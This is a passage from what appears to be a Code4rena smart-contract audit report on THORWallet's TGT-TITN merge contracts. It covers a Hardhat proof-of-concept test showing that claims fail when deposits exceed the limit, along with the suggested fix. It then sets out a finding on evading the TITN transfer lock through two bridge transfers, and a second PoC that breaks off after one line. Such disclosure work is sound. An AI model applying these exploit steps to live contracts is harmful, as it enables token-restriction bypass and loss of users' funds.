<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'578999999'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'1000'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">user3</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'1000'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">describe</span><span class="mtk1">(</span><span class="mtk8">'General tests'</span><span class="mtk1">, </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">'Users can</span><span class="mtk6">\'</span><span class="mtk8">t claim if more than TGT limit is deposited'</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// transfer TGT to the merge contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'578999999'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">transferAndCall</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'578999999'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">), </span><span class="mtk8">'0x'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'100'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">).</span><span class="mtk11">transferAndCall</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'100'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">), </span><span class="mtk8">'0x'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">claimableAmountUser2</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">claimableTitnPerUser</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">).</span><span class="mtk11">claimTitn</span><span class="mtk1">(</span><span class="mtk12">claimableAmountUser2</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// claim TITN</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">claimableAmountUser1</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">claimableTitnPerUser</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">claimableAmountUser1</span><span class="mtk1">.</span><span class="mtk11">toString</span><span class="mtk1">()).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk12">be</span><span class="mtk1">.</span><span class="mtk11">equal</span><span class="mtk1">(</span><span class="mtk8">'173699999700000000000000000'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// @audit fails due to insufficient TITN in mergeTGT</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">claimTitn</span><span class="mtk1">(</span><span class="mtk12">claimableAmountUser1</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">})</span></span></span></code></pre>
<p>Test final claim fails with:</p>
<pre data-index="2" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"> Error: VM Exception while processing transaction: reverted with custom error 'ERC20InsufficientBalance("0x5FC8d32690cc91D4c39d9d3abcBD16989F875707", 173699970000000000000000000, 173699999700000000000000000)'</span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps"><a class="anchor before" aria-label="recommended mitigation steps permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Limit the total deposits to TGT<em>TO</em>EXCHANGE by tracking how much TGT has already been deposited.
MergeTgt.sol</p>
<pre data-index="3" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">totalTgtDeposited</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">onTokenTransfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">extraData</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">totalTgtDeposited</span><span class="mtk1"> + </span><span class="mtk12">amount</span><span class="mtk1"> &gt; </span><span class="mtk12">TGT_TO_EXCHANGE</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">TGTExceeded</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk12">totalTgtDeposited</span><span class="mtk1"> += </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Or </p>
<p>the same idea, but limit the <code>totalTitnClaimable</code> by TITN_ARB value. This will likely be more efficient, as the rate tgt/titn is dynamic.</p>
<p><strong><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-6?commentParent=WkFsWvrbfsy">cacaomatt (THORWallet) confirmed and commented</a>:</strong></p>
<blockquote>
<p>This is related to <a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/S-88">S-88</a>.
The fix for both of them (same issue, different approach) can be found on the same PR <a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2">here</a>.</p>
</blockquote>
<p><strong><a href="https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file#findings-being-mitigated">THORWallet mitigated</a>:</strong>.</p>
<blockquote>
<p>The PR <a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-2">here</a> fixes the issue when depositing more TGT and specified in the contract.</p>
</blockquote>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-3">shaflow2</a>, <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-14">web3km</a>, and <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-12">kn0t</a>.</p>
<hr>
<h2 style="position:relative;" id="h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted"><a class="anchor before" aria-label="h 2 the user can send tokens to any address by using two bridge transfers even when transfers are restricted permalink" href="https://code4rena.com/reports/2025-02-thorwallet#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9">[H-2] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-391">shaflow2</a>, also found by <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-753">0xAadi</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-457">Agorist</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-397">Alekso</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-68">arnie</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-576">doublekk</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-747">falconhoof</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-4">Giorgio</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-622">hezze</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-371">iamandreiski</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-392">jesjupyter</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-342">kn0t</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-501">KupiaSec</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-489">MrValioBg</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-116">pairingfriendly</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-374">Pelz</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-526">phoenixV110</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-261">radev_sw</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-401">slowbugmayor</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-161">SpicyMeatball</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-404">undefined_joe</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-304">vladi319</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-59">web3km</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-688">X-Tray03</a>, <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-175">ZoA</a>, and <a href="https://code4rena.com/audits/2025-02-thorwallet/submissions/S-638">zzykxx</a></em></p>
<p><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L103">https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L103</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-1"><a class="anchor before" aria-label="finding description and impact 1 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#finding-description-and-impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>When <code>isBridgedTokensTransferLocked</code> is set to true, regular users’ <code>transfer</code> and <code>transferFrom</code> operations will be restricted. Regular users should not send their tokens to any address other than the <code>transferAllowedContract</code> and <code>lzEndpoint</code>. However, since bridge operations are not subject to this restriction, users can send tokens to any address by performing two bridge transfers.<br>
This breaks the primary invariant: <em>Unless enabled (or the user is the admin), users who merge their TGT to TITN should not be able to transfer them to any address other than the LayerZero endpoint or a specified contract address (<code>transferAllowedContract</code>).</em></p>
<h3 style="position:relative;" id="proof-of-concept-1"><a class="anchor before" aria-label="proof of concept 1 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>The TITN contract overrides the <code>transfer</code> and <code>transferFrom</code> functions, adding the <code>_validateTransfer</code> validation to restrict regular users’ transfers in certain cases, as determined by the admin.
<a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L71">https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L71</a>. </p>
<pre data-index="4" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_validateTransfer</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk4">super</span><span class="mtk1">.</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transferFrom</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_validateTransfer</span><span class="mtk1">(</span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk4">super</span><span class="mtk1">.</span><span class="mtk11">transferFrom</span><span class="mtk1">(</span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     * @</span><span class="mtk12">dev</span><span class="mtk1"> </span><span class="mtk12">Validates</span><span class="mtk1"> </span><span class="mtk12">transfer</span><span class="mtk1"> </span><span class="mtk12">restrictions</span><span class="mtk1">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     * @</span><span class="mtk12">param</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1"> </span><span class="mtk12">The</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk8">'s address</span><span class="mtk14">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     * @</span><span class="mtk12">param</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">The</span><span class="mtk1"> </span><span class="mtk12">recipient</span><span class="mtk8">'s address</span><span class="mtk14">.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     */</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_validateTransfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Arbitrum chain ID</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">arbitrumChainId</span><span class="mtk1"> = </span><span class="mtk7">42161</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Check if the transfer is restricted</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">from</span><span class="mtk1"> != </span><span class="mtk11">owner</span><span class="mtk1">() &amp;&amp; </span><span class="mtk3">// Exclude owner from restrictions</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">from</span><span class="mtk1"> != </span><span class="mtk12">transferAllowedContract</span><span class="mtk1"> &amp;&amp; </span><span class="mtk3">// Allow transfers to the transferAllowedContract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk12">transferAllowedContract</span><span class="mtk1"> &amp;&amp; </span><span class="mtk3">// Allow transfers to the transferAllowedContract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">isBridgedTokensTransferLocked</span><span class="mtk1"> &amp;&amp; </span><span class="mtk3">// Check if bridged transfers are locked</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Restrict bridged token holders OR apply Arbitrum-specific restriction</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            (</span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">] || </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">chainid</span><span class="mtk1"> == </span><span class="mtk12">arbitrumChainId</span><span class="mtk1">) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk12">lzEndpoint</span><span class="mtk1"> </span><span class="mtk3">// Allow transfers to LayerZero endpoint</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">BridgedTokensTransferLocked</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, since bridge operations do not use <code>transfer</code>/<code>transferFrom</code>, but instead use <code>mint</code>/<code>burn</code>, this allows users to transfer tokens to any address by performing two bridge operations. </p>
<p>For example:</p>
<ol>
<li>Currently, <code>isBridgedTokensTransferLocked</code> is set to <code>true</code>, and <code>user1</code> holds 1 Ether TITN on Arbitrum. <code>user1</code> wants to transfer these tokens to <code>user2</code>.</li>
<li><code>user1</code> calls <code>send</code> to bridge the TITN to their address on Base.</li>
<li><code>user1</code> calls <code>send</code> again on Base to bridge the TITN to <code>user2</code>’s address on Arbitrum.</li>
<li><code>user1</code> successfully sends 1 Ether TITN to <code>user2</code>.</li>
</ol>
<p> <strong>Proof Of Concept</strong></p>
<p>To run the POC, you can add the following code to the test/hardhat/MergeTgt.test.ts file:</p>
<pre data-index="5" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">'user1  transfer TITN tokens to user2 by bridge when transfer disable'</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// transfer TGT to the merge contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'100'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
